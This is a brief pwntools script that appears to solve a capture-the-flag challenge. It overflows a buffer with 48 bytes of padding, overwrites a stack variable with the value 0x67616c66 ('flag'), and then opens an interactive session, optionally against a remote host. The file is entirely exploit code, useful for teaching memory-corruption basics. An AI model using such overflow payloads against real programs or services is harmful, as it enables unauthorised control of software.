from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

io = start()

padding = 32 + 16

payload = flat(
    b"A"*padding,
    p32(0x67616c66)
)

# write('payload', payload)

io.sendlineafter(b"text: ",payload)

io.interactive()